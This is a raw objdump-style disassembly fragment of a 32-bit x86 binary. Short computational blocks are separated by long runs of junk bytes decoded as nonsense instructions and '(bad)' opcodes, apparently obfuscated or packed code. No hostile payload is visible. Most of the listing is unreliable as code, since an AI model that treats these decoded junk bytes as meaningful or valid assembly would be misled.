  4041ef:	add    DWORD PTR [esp+eax*8+0x13735c5b],esp
  4041f6:	es retf 0x78b1
  4041fa:	lods   al,BYTE PTR ds:[esi]
  4041fb:	jbe    0x404262
  4041fd:	es push ss
  4041ff:	(bad)  
  404200:	iret   
  404201:	int3   
  404202:	adc    bl,BYTE PTR [edx]
  404204:	dec    eax
  404205:	call   0xfe1f215d
  40420a:	and    ecx,edx
  40420c:	adc    eax,0x6aee4174
  404211:	in     al,0xb5
  404213:	xchg   edx,eax
  404214:	or     DWORD PTR fs:[esi-0x51f08ccd],ebp
  40421b:	mov    DWORD PTR [ebp+0x4],0xfaaeba92
  404222:	icebp  
  404223:	fscale 
  404225:	in     al,dx
  404226:	add    DWORD PTR [esi-0x3b],ebx
  404229:	(bad)  
  40422a:	mov    ch,0x11
  40422c:	jmp    0xd779:0x947208ab
  404233:	xchg   ecx,eax
  404234:	inc    edx
  404235:	push   esp
  404236:	inc    esi
  404237:	loop   0x4041ff
  404239:	sub    ah,ah
  40423b:	jbe    0x404244
  40423d:	and    esi,DWORD PTR [esi+0x2930b26d]
  404243:	js     0x4042af
  404245:	cmp    edx,DWORD PTR [edx-0x5a]
  404248:	jne    0x40427e
  40424a:	into   
  40424b:	pop    ss
  40424c:	xor    edx,eax
  40424e:	xor    edi,eax
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	cmp    BYTE PTR [edi+0x3c],cl
  404264:	loop   0x404253
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x4042d5
  40426e:	jns    0x404247
  404270:	std    
  404271:	cli    
  404272:	das    
  404273:	mov    dl,dh
  404275:	ss xchg esp,eax
  404277:	aad    0x34
  404279:	and    DWORD PTR ds:0x57adf684,0xf248c0a2
  404283:	xchg   ebp,eax
  404284:	and    al,0xb8
  404286:	into   
  404287:	dec    edi
  404288:	es mov dh,0x6a
  40428b:	xchg   edx,eax
  40428c:	shl    ch,0x21
  40428f:	out    dx,eax
  404290:	inc    ebx
  404291:	(bad)  
  404292:	mov    ds:0x72777b9,eax
  404297:	sbb    eax,0xb46e0b8a
  40429c:	and    DWORD PTR [ecx+ecx*2-0x4c3a58cb],ebp
  4042a3:	or     eax,0xd78ac3d3
  4042a8:	push   ebp
  4042a9:	rol    DWORD PTR [ecx+0x73],1
  4042ac:	cmp    ecx,DWORD PTR [edx-0x48]
  4042af:	jmp    0x404281
  4042b1:	std    
  4042b2:	mov    ds:0x27237842,al
  4042b7:	push   0x44
  4042b9:	ret    
  4042ba:	popa   
  4042bb:	frstor [ebx]
  4042bd:	shl    BYTE PTR [esi],1
  4042bf:	and    eax,0xb9a33772
  4042c4:	cmp    BYTE PTR [eax],ch
  4042c6:	jmp    0x404283
  4042c8:	gs cmp esi,ebp
  4042cb:	out    dx,al
  4042cc:	mov    dl,0xac
  4042ce:	cwde   
  4042cf:	sub    eax,0x5b84f267
  4042d4:	xchg   esi,eax
  4042d5:	test   ah,dh
  4042d7:	lock icebp 
  4042d9:	jp     0x4042b5
  4042db:	cmp    al,0xa8
  4042dd:	xchg   BYTE PTR [edi-0x4e],al
  4042e0:	mov    BYTE PTR [eax+0x5c2f678c],bl
  4042e6:	cmp    al,BYTE PTR [ebp+0xb2da2ad]
  4042ec:	mov    ds:0xf4cf4ad3,eax
  4042f1:	ffree  st(3)
  4042f3:	jne    0x4042a0
  4042f5:	mov    ch,0xb5
  4042f7:	jo     0x40428f
  4042f9:	and    eax,0x6e905d4a
  4042fe:	dec    edx
  4042ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404300:	jl     0x4042a8
  404302:	xchg   esp,eax
  404303:	stos   BYTE PTR es:[edi],al
  404304:	ins    DWORD PTR es:[edi],dx
  404305:	sub    bh,ch
  404307:	stc    
  404308:	xchg   ebp,eax
  404309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40430a:	xchg   edi,eax
  40430b:	push   cs
  40430c:	stos   DWORD PTR es:[edi],eax
  40430d:	imul   edx,DWORD PTR [edx],0xffffffef
  404310:	dec    edx
  404311:	je     0x404361
  404313:	fwait
  404314:	addr16 push edx
  404316:	jp     0x404312
  404318:	in     al,0xb7
  40431a:	lea    ebp,[ebp-0x63340175]
  404320:	(bad)  
  404322:	xchg   DWORD PTR [ebx],esp
  404324:	add    eax,0x2086b45
  404329:	dec    eax
  40432a:	(bad)  
  40432b:	sahf   
  40432c:	inc    esi
  40432d:	loope  0x40430e
  40432f:	push   ebp
  404330:	das    
  404331:	mov    ch,0xd1
  404333:	add    al,0x9c
  404335:	sub    al,0x82
  404337:	sub    bl,ah
  404339:	inc    esi
  40433a:	sar    ch,cl
  40433c:	jne    0x40432b
  40433e:	mov    ch,0xaf
  404340:	pop    ebx
  404341:	rcl    BYTE PTR [eax+0x469877ce],1
  404347:	jl     0x4042ed
  404349:	out    0xf,eax
  40434b:	imul   ebx,DWORD PTR [ecx+0x794fbfdd],0xffffff9b
  404352:	fist   WORD PTR [esi+eiz*4+0x361ae912]
  404359:	mov    ah,0x12
  40435b:	es or  al,0x74
  40435e:	rol    BYTE PTR [ebp+0x58bfc0e2],cl
  404364:	adc    ah,cl
  404366:	adc    eax,0xdc43fdb7
  40436b:	mov    ds:0xfa44d792,eax
  404370:	sbb    dl,BYTE PTR [ecx*2-0x2be84195]
  404377:	scas   al,BYTE PTR es:[edi]
  404378:	or     eax,0xa0662e8a
  40437d:	sahf   
  40437e:	sub    DWORD PTR [edx],ebx
  404380:	or     ch,BYTE PTR [ebx-0x60]
  404383:	jecxz  0x40436f
  404385:	cmp    DWORD PTR [ecx],edx
  404387:	push   ds
  404388:	jg     0x4043f4
  40438a:	and    eax,0xca0d143f
  40438f:	fmul   QWORD PTR [ecx-0x4c]
  404392:	pop    esp
  404393:	inc    edx
  404394:	or     ebp,DWORD PTR [edx+0x67]
  404397:	sub    ah,cl
  404399:	dec    ebx
  40439a:	dec    ebp
  40439b:	out    dx,eax
  40439c:	mov    ch,0x38
  40439e:	and    al,al
  4043a0:	mov    DWORD PTR [ebx+0x748e1118],esi
  4043a6:	or     bl,BYTE PTR [ebx]
  4043a8:	je     0x4043fb
  4043aa:	daa    
  4043ab:	aaa    
  4043ac:	rol    DWORD PTR [ecx],0xcb
  4043af:	pop    edi
  4043b0:	fmul   DWORD PTR [ecx]
  4043b2:	js     0x40435a
  4043b4:	jge    0x404432
  4043b6:	sub    eax,0x8e6fe151
  4043bb:	push   0xffffffef
  4043bd:	js     0x4043c7
  4043bf:	jge    0x404372
  4043c1:	sbb    BYTE PTR [edx-0x3d],0x51
  4043c5:	pop    es
  4043c6:	or     dl,0x21
  4043c9:	sub    al,0x2
  4043cb:	add    esp,DWORD PTR [edx-0x47]
  4043ce:	dec    ecx
  4043cf:	mov    ds:0x760f86d4,eax
  4043d4:	sub    BYTE PTR [edx+ebx*8-0x692bdeae],0xed
  4043dc:	add    edx,ebx
  4043de:	pusha  
  4043df:	in     al,dx
  4043e0:	add    DWORD PTR [edx],eax
  4043e2:	xor    al,0x26
  4043e4:	add    DWORD PTR [eax],esi
  4043e6:	mov    bl,0x35
  4043e8:	xor    ah,BYTE PTR ds:0x8888365c
  4043ee:	add    al,0xf7
  4043f0:	leave  
  4043f1:	shl    BYTE PTR [ebx+0x667168d3],1
  4043f7:	or     eax,0xf903e4a8
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0xdcd7bfdf,al
  40444e:	aam    0x7a
  404450:	pop    ss
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x404472
  404458:	(bad)  
  404459:	cvtps2pi mm1,QWORD PTR [edx+eax*2]
  40445d:	inc    ecx
  40445e:	push   edx
  40445f:	push   edi
  404460:	pusha  
  404461:	loop   0x404441
  404463:	or     eax,0xe8357d70
  404468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404469:	shl    ah,1
  40446b:	lods   al,BYTE PTR ds:[esi]
  40446c:	rol    ch,cl
  40446e:	dec    edx
  40446f:	xchg   ebx,eax
  404470:	sahf   
  404471:	dec    esp
  404472:	inc    edi
  404473:	lods   al,BYTE PTR ds:[esi]
  404474:	dec    esp
  404475:	dec    ebp
  404476:	scas   al,BYTE PTR es:[edi]
  404477:	xchg   DWORD PTR [ecx+0x2937e3dd],esi
  40447d:	sub    ah,BYTE PTR [ecx-0x1b]
  404480:	imul   esp,ecx,0x12
  404483:	jae    0x404481
  404485:	lahf   
  404486:	xchg   esi,eax
  404487:	lahf   
  404488:	fxch   st(7)
  40448a:	lods   eax,DWORD PTR ds:[esi]
  40448b:	pop    ebx
  40448c:	xor    ch,BYTE PTR [eax+0x14]
  40448f:	in     eax,dx
  404490:	push   es
  404491:	call   0xff8296ea
  404496:	popa   
  404497:	mov    ebp,cs
  404499:	push   ecx
  40449a:	pop    ds
  40449b:	jno    0x404508
  40449d:	cmp    cl,BYTE PTR [ecx-0x3afc6bb4]
  4044a3:	inc    esi
  4044a4:	lahf   
  4044a5:	add    al,0xe4
  4044a7:	mov    al,0x31
  4044a9:	jmp    0x404444
  4044ab:	and    DWORD PTR [ecx-0x6f2ccfaa],edi
  4044b1:	dec    edx
  4044b2:	mov    esi,0x243cc8e4
  4044b7:	dec    edi
  4044b8:	sub    eax,0x33f67b8c
  4044bd:	mul    DWORD PTR [edx]
  4044bf:	xor    BYTE PTR [ebp+0x46652f88],bl
  4044c5:	cdq    
  4044c6:	dec    esi
  4044c7:	or     al,0x38
  4044c9:	imul   edi,DWORD PTR [ecx-0x416948bc],0x33
  4044d0:	cmc    
  4044d1:	and    dh,BYTE PTR ss:[eax+0x50]
  4044d5:	jns    0x4044dd
  4044d7:	aad    0x8d
  4044d9:	fdivrp st(3),st
  4044db:	xchg   DWORD PTR [ebp+0x45],edx
  4044de:	cli    
  4044df:	inc    edx
  4044e0:	sti    
  4044e1:	push   0xffffffad
  4044e3:	mov    ah,0xd4
  4044e5:	push   ss
  4044e6:	std    
  4044e7:	adc    al,0xb8
  4044e9:	loope  0x40452d
  4044eb:	mov    ah,0x6f
  4044ed:	bound  edi,QWORD PTR [edx]
  4044ef:	jae    0x404483
  4044f1:	mov    ss,WORD PTR [edx]
  4044f3:	and    ebx,edi
  4044f5:	mov    cl,0x1e
  4044f7:	cwde   
  4044f8:	sub    dh,BYTE PTR [ecx-0xf]
  4044fb:	das    
  4044fc:	inc    ebx
  4044fd:	add    ch,dl
  4044ff:	mov    ecx,0xcc95228e
  404504:	inc    edx
  404505:	retf   
  404506:	pop    esi
  404507:	sbb    BYTE PTR [edx-0x62f5974d],dl
  40450d:	add    eax,0xe556ca54
  404512:	aam    0xe
  404514:	pop    edi
  404515:	pop    esi
  404516:	pushf  
  404517:	inc    eax
  404518:	les    ecx,FWORD PTR [ecx-0x528ec734]
  40451e:	xor    ah,cl
  404520:	push   ecx
  404521:	ror    DWORD PTR fs:[eax+0x1d0dd67],1
  404528:	xchg   edi,eax
  404529:	dec    edx
  40452a:	mov    dl,0xdc
  40452c:	scas   al,BYTE PTR es:[edi]
  40452d:	xlat   BYTE PTR ds:[ebx]
  40452e:	mov    ch,0x70
  404530:	push   edx
  404531:	es push ds
  404533:	fld    QWORD PTR [edx-0x12]
  404536:	jnp    0x40458a
  404538:	shr    DWORD PTR [esi+0x27741037],cl
  40453e:	and    DWORD PTR [eax],esi
  404540:	xor    al,0xbe
  404542:	js     0x404534
  404544:	add    dl,bl
  404546:	(bad)  
  404547:	mov    bh,0xe6
  404549:	ret    
  40454a:	(bad)  
  40454b:	xor    BYTE PTR [ebx-0x11],al
  40454e:	loop   0x4045c9
  404550:	shl    BYTE PTR [edx+0x1f2116ce],cl
  404556:	xor    al,0x2d
  404558:	popf   
  404559:	mov    al,ds:0xdf2cb2ed
  40455e:	mov    bl,0xf0
  404560:	scas   al,BYTE PTR es:[edi]
  404561:	mov    cl,BYTE PTR [ebx]
  404563:	push   ds
  404564:	and    dl,dh
  404566:	inc    ebx
  404567:	icebp  
  404568:	adc    al,BYTE PTR [edi]
  40456a:	cld    
  40456b:	sahf   
  40456c:	or     BYTE PTR [eax],ch
  40456e:	fidivr WORD PTR [ebp-0x6d]
  404571:	fs jno 0x404564
  404574:	cmp    al,cl
  404576:	rcr    BYTE PTR [ebp+0x2fe2577a],0xc7
  40457d:	mov    esi,ebp
  40457f:	popa   
  404580:	mov    ecx,ecx
  404582:	and    esi,DWORD PTR [eax+0xc11b57d]
  404588:	jge    0x4045bb
  40458a:	mov    dh,0x88
  40458c:	add    DWORD PTR [eax],ebp
  40458e:	mov    dh,BYTE PTR cs:0x429138ad
  404595:	das    
  404596:	cmp    eax,0x172126e1
  40459b:	dec    esi
  40459c:	mov    edx,0xc4212f18
  4045a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045a2:	out    dx,eax
  4045a3:	leave  
  4045a4:	loope  0x40455c
  4045a6:	xchg   esi,eax
  4045a7:	in     al,dx
  4045a8:	(bad)  
  4045aa:	adc    edx,edx
  4045ac:	jge    0x40453a
  4045ae:	mov    edx,0xb72dec32
  4045b3:	leave  
  4045b4:	imul   ebx,ebp,0x3a
  4045b7:	inc    ecx
  4045b8:	imul   edx,DWORD PTR [edx],0x6
  4045bb:	push   esp
  4045bc:	pop    ds
  4045bd:	daa    
  4045be:	xchg   edi,ebp
  4045c0:	loop   0x40457a
  4045c2:	dec    esp
  4045c3:	cmp    al,0xb6
  4045c5:	cs and al,0x28
  4045c8:	bndstx [esi],bnd3
  4045cb:	push   ebp
  4045cc:	jae    0x404639
  4045ce:	arpl   WORD PTR [ecx-0x4f],sp
  4045d1:	xor    bl,BYTE PTR ds:0x32270a4c
  4045d7:	out    0x2d,eax
  4045d9:	fsub   st,st(1)
  4045db:	hlt    
  4045dc:	outs   dx,BYTE PTR ds:[esi]
  4045dd:	lods   al,BYTE PTR ds:[esi]
  4045de:	(bad)  
  4045df:	pop    edi
  4045e0:	nop
  4045e1:	push   cs
  4045e2:	inc    ebp
  4045e3:	pop    edi
  4045e4:	mov    edx,DWORD PTR [ebp-0x34]
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x4c4440d0],al
  40466a:	pause  
  40466c:	imul   DWORD PTR [ecx]
  40466e:	jle    0x4046ee
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x4046cb
  404675:	push   cs
  404676:	pop    ebx
  404677:	push   0x158d3eba
  40467c:	out    0x2e,eax
  40467e:	push   ecx
  40467f:	dec    ebp
  404680:	jns    0x4046d6
  404682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404683:	cmp    BYTE PTR [ebx+ecx*1-0x4d],dl
  404687:	jnp    0x40465d
  404689:	mov    esi,0x9e53f4ef
  40468e:	inc    edi
  40468f:	jno    0x4046c2
  404691:	fdiv   st(1),st
  404693:	xchg   al,al
  404695:	repnz or eax,0x9aadc0f5
  40469b:	scas   al,BYTE PTR es:[edi]
  40469c:	out    dx,eax
  40469d:	mov    eax,ds:0xa50251c5
  4046a2:	cmp    al,0x3a
  4046a4:	adc    eax,0x184705a0
  4046a9:	out    0x14,eax
  4046ab:	cmp    al,0xd3
  4046ad:	push   0x4dfd9feb
  4046b2:	sbb    bl,BYTE PTR [esi-0x2d]
  4046b5:	cli    
  4046b6:	mov    esi,0xaeccae56
  4046bb:	jns    0x404723
  4046bd:	inc    ebx
  4046be:	push   cs
  4046bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046c0:	mov    ebx,0x77f15980
  4046c5:	jae    0x40471d
  4046c7:	push   esp
  4046c8:	pop    eax
  4046c9:	sub    ah,BYTE PTR [ebx]
  4046cb:	lds    esp,FWORD PTR [edx-0x5d]
  4046ce:	inc    ebp
  4046cf:	dec    edx
  4046d0:	outs   dx,DWORD PTR ds:[esi]
  4046d1:	gs pop ecx
  4046d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046d4:	sbb    DWORD PTR [edi],edx
  4046d6:	imul   ebp,ebx,0x8bed9e80
  4046dc:	hlt    
  4046dd:	test   BYTE PTR [ecx+esi*1-0x7],ah
  4046e1:	push   DWORD PTR [edx-0x7b64c040]
  4046e7:	add    BYTE PTR [ecx],0xa7
  4046ea:	adc    eax,0xe789a7f
  4046ef:	sti    
  4046f0:	retf   
  4046f1:	mov    esp,0x41435b8b
  4046f6:	jno    0x40474e
  4046f8:	leave  
  4046f9:	cmp    BYTE PTR [eax-0x5737cc80],0xbc
  404700:	sub    al,0xd2
  404702:	jne    0x4046b7
  404704:	inc    esp
  404705:	push   cs
  404706:	mov    al,0x4
  404708:	lahf   
  404709:	xchg   esi,esi
  40470b:	call   0x7471:0x64c9ec08
  404712:	mov    esi,0x83474223
  404717:	mov    edx,ecx
  404719:	xchg   ebp,eax
  40471a:	dec    ebx
  40471b:	rcr    DWORD PTR fs:0xd9028687,cl
  404722:	add    al,0xf3
  404724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404725:	fdiv   st(1),st
  404727:	mov    dl,0x69
  404729:	pop    ebp
  40472a:	cmp    eax,0xc837a5d5
  40472f:	pop    ebp
  404730:	xchg   edi,eax
  404731:	add    eax,0x7b098ec
  404736:	fadd   DWORD PTR [eax-0x26751f38]
  40473c:	inc    esi
  40473d:	mov    es,edi
  40473f:	jecxz  0x404752
  404741:	aad    0xe5
  404743:	push   ds
  404744:	ins    BYTE PTR es:[edi],dx
  404745:	mov    dh,0xb5
  404747:	das    
  404748:	out    dx,eax
  404749:	mov    eax,0xc214bdaa
  40474e:	xor    al,0x6
  404750:	or     dl,BYTE PTR [eax-0x26]
  404753:	popa   
  404754:	xchg   esp,eax
  404755:	inc    esi
  404756:	sbb    dh,ah
  404758:	or     edi,DWORD PTR [ebx-0x45336755]
  40475e:	push   esi
  40475f:	xor    ch,BYTE PTR [eiz*8+0x4c170c98]
  404766:	pusha  
  404767:	xor    BYTE PTR [ecx],ch
  404769:	add    al,BYTE PTR [esi]
  40476b:	and    edx,edx
  40476d:	mov    ebp,0xb05c20e6
  404772:	out    dx,al
  404773:	add    al,0x20
  404775:	(bad)  
  404776:	mov    esi,0x13d49f23
  40477b:	sub    BYTE PTR [edx-0x514b389],ch
  404781:	adc    al,0x31
  404783:	retf   0x8f2c
  404786:	mov    eax,0x4f3928c7
  40478b:	or     cl,dl
  40478d:	push   ecx
  40478e:	jmp    DWORD PTR [edx]
  404790:	xlat   BYTE PTR ds:[ebx]
  404791:	pop    ss
  404792:	in     eax,dx
  404793:	and    eax,0x2d7079b4
  404798:	mov    al,ds:0xbe675ea0
  40479d:	and    BYTE PTR [ebx],0xfd
  4047a0:	aad    0xd8
  4047a2:	jnp    0x404807
  4047a4:	out    dx,al
  4047a5:	or     eax,0xeaa80cd
  4047aa:	add    ebx,DWORD PTR [esi-0x45]
  4047ad:	jb     0x404787
  4047af:	pop    ecx
  4047b0:	jne    0x4047ba
  4047b2:	mov    ebp,DWORD PTR [esi]
  4047b4:	mov    bl,0x4f
  4047b6:	stc    
  4047b7:	dec    ebx
  4047b8:	push   0xffffffc4
  4047ba:	stc    
  4047bb:	popf   
  4047bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047bd:	push   cs
  4047be:	add    edi,DWORD PTR [edi]
  4047c0:	jae    0x40483a
  4047c2:	cmp    eax,0x105f9934
  4047c7:	inc    ecx
  4047c8:	mov    al,0x33
  4047ca:	mov    ebp,0xa0717795
  4047cf:	loope  0x4047ab
  4047d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047d2:	scas   al,BYTE PTR es:[edi]
  4047d3:	mov    BYTE PTR [edx-0xd],bl
  4047d6:	jl     0x404800
  4047d8:	(bad)  
  4047d9:	xor    al,dh
  4047db:	adc    ebx,DWORD PTR [ebp+ebx*4-0x51]
  4047df:	sub    bl,al
  4047e1:	ss leave 
  4047e3:	mov    edx,0x8c1d6322
  4047e8:	xchg   ecx,eax
  4047e9:	or     eax,0xac3bdb08
  4047ee:	xor    al,bh
  4047f0:	add    eax,esi
  4047f2:	cmp    al,BYTE PTR [ebp+0x29d63371]
  4047f8:	xchg   edi,eax
  4047f9:	fwait
  4047fa:	lods   eax,DWORD PTR ds:[esi]
  4047fb:	pop    esp
  4047fc:	sbb    edx,esp
  4047fe:	pop    ebx
  4047ff:	push   ebp
  404801:	xor    edx,eax
  404803:	add    edx,DWORD PTR [ebp-0x14]
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx+0x7333f0ba],0x49
  40482a:	std    
  40482b:	add    al,0x2b
  40482d:	jle    0x4048ad
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x404871
  404834:	retf   
  404835:	jne    0x404875
  404837:	inc    esp
  404838:	sbb    al,0x2b
  40483a:	mov    ecx,DWORD PTR [edi-0x7a]
  40483d:	xchg   ecx,eax
  40483e:	in     eax,0x74
  404840:	leave  
  404841:	cmp    al,0xb5
  404843:	xor    DWORD PTR [ecx],0xffffffad
  404846:	je     0x40484b
  404848:	mov    ch,0x4c
  40484a:	das    
  40484b:	xor    al,0x17
  40484d:	xor    eax,DWORD PTR [ebx+0x297ee0f9]
  404853:	pop    esi
  404854:	pop    edi
  404855:	adc    BYTE PTR [edi-0x31],dh
  404858:	adc    edi,esp
  40485a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40485b:	retf   
  40485c:	in     al,dx
  40485d:	or     al,0xf2
  40485f:	xchg   ebp,eax
  404860:	cs (bad) 
  404862:	addr16 sbb al,0x96
  404865:	enter  0x4fa6,0xae
  404869:	mov    eax,ss
  40486b:	imul   ecx,DWORD PTR [ebx+edx*4],0xe0a8c8ec
  404872:	mov    edi,0x32a182b2
  404877:	and    dl,cl
  404879:	pop    ss
  40487a:	xor    edi,eax
  40487c:	ss clts 
  40487f:	lahf   
  404880:	dec    ebx
  404881:	inc    ebp
  404882:	in     al,dx
  404883:	inc    edx
  404884:	fimul  WORD PTR [edi]
  404886:	push   eax
  404887:	cli    
  404888:	xchg   ebx,eax
  404889:	mov    edi,0xb5f3b06a
  40488e:	add    eax,0x26650490
  404893:	xchg   edx,eax
  404894:	inc    esi
  404895:	sub    ebp,esi
  404897:	inc    ecx
  404898:	nop
  404899:	stc    
  40489a:	(bad)  
  40489c:	or     eax,0x1c0d1ec0
  4048a1:	push   ecx
  4048a2:	fwait
  4048a3:	dec    edx
  4048a4:	(bad)  
  4048a5:	sti    
  4048a6:	dec    ecx
  4048a7:	mov    ds:0x357d6ee2,al
  4048ac:	cdq    
  4048ad:	jle    0x4048ff
  4048af:	jecxz  0x404852
  4048b1:	imul   eax,DWORD PTR [ecx+0x5df04e00],0x2c
  4048b8:	addr16 pushf 
  4048ba:	shr    BYTE PTR [edi+0x79e48a93],0x79
  4048c1:	xchg   ebp,eax
  4048c2:	js     0x404849
  4048c4:	adc    esp,DWORD PTR [esi+0x51]
  4048c7:	mov    WORD PTR [eax],?
  4048c9:	scas   eax,DWORD PTR es:[edi]
  4048ca:	sahf   
  4048cb:	or     al,0xb2
  4048cd:	cwde   
  4048ce:	pop    es
  4048cf:	and    ebp,esi
  4048d1:	cs xchg ecx,eax
  4048d3:	push   esi
  4048d4:	xchg   edi,eax
  4048d5:	sbb    edx,esp
  4048d7:	das    
  4048d8:	fistp  DWORD PTR [edi]
  4048da:	jl     0x40493e
  4048dc:	sbb    DWORD PTR [ebx+ebx*2+0x145bd194],esp
  4048e3:	or     BYTE PTR [edi+0x2add1bb],bl
  4048e9:	dec    esi
  4048ea:	in     al,0xf7
  4048ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048ed:	ficomp DWORD PTR [edx-0x6]
  4048f0:	jmp    0x404947
  4048f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048f3:	cmp    ah,BYTE PTR [ebp+0x3c63949e]
  4048f9:	lods   al,BYTE PTR ds:[esi]
  4048fa:	fwait
  4048fb:	jb     0x40487f
  4048fd:	sahf   
  4048fe:	dec    esp
  4048ff:	sbb    BYTE PTR [edx],cl
  404901:	fist   DWORD PTR [edi]
  404903:	jmp    0x3ae9e4e7
  404908:	push   0x36c465d2
  40490d:	push   ebx
  40490e:	icebp  
  40490f:	neg    BYTE PTR [edi+eax*4]
  404912:	or     BYTE PTR [eax+0x12eec378],cl
  404918:	mov    ds:0x5edb038c,eax
  40491d:	sub    eax,0xbe468b2d
  404922:	mov    dh,0x9d
  404924:	push   edi
  404925:	aaa    
  404926:	mov    ah,0x71
  404928:	xor    DWORD PTR [ebx+0x7e2271],esi
  40492e:	inc    esi
  40492f:	dec    edx
  404930:	cmc    
  404931:	pop    ss
  404932:	sbb    DWORD PTR [edx+0x3de52a58],esp
  404938:	mov    WORD PTR [ecx+0x63c7640c],fs
  40493e:	call   0x87ea:0x658911bd
  404945:	mov    edi,0xe1a63acf
  40494a:	outs   dx,DWORD PTR ds:[esi]
  40494b:	into   
  40494c:	jns    0x4049be
  40494e:	popa   
  40494f:	bound  esi,QWORD PTR [esi-0x2a]
  404952:	mov    ds:0xdd25f6fe,al
  404957:	pop    ecx
  404958:	push   ebx
  404959:	into   
  40495a:	dec    ebp
  40495b:	xor    al,0x8e
  40495d:	shr    BYTE PTR [edx-0x73],0xc8
  404961:	clc    
  404962:	push   esp
  404963:	mov    ebp,0x992c5d2c
  404968:	retf   
  404969:	repnz les ebx,FWORD PTR [ecx]
  40496c:	stos   DWORD PTR es:[edi],eax
  40496d:	fild   QWORD PTR [esi]
  40496f:	jg     0x4048fe
  404971:	cli    
  404972:	das    
  404973:	test   dh,0xa9
  404976:	rol    BYTE PTR [ebx-0x1e7d2c5a],1
  40497c:	enter  0x41eb,0xcf
  404980:	pusha  
  404981:	add    eax,0x40351420
  404986:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  404988:	rcl    BYTE PTR [eax+0x7ddf1f23],1
  40498e:	mov    ah,0xce
  404990:	jnp    0x404949
  404992:	fidivr WORD PTR [ecx+0x4c4d24b]
  404998:	das    
  404999:	push   ds
  40499a:	gs jle 0x4049cb
  40499d:	xor    dh,dh
  40499f:	cdq    
  4049a0:	adc    dh,cl
  4049a2:	mov    eax,0x15344925
  4049a7:	pop    edx
  4049a8:	(bad)  
  4049a9:	hlt    
  4049aa:	and    al,0xa3
  4049ac:	(bad)  
  4049ad:	xor    eax,0xb904c8f7
  4049b2:	inc    eax
  4049b3:	data16 cli 
  4049b5:	pushf  
  4049b6:	inc    ecx
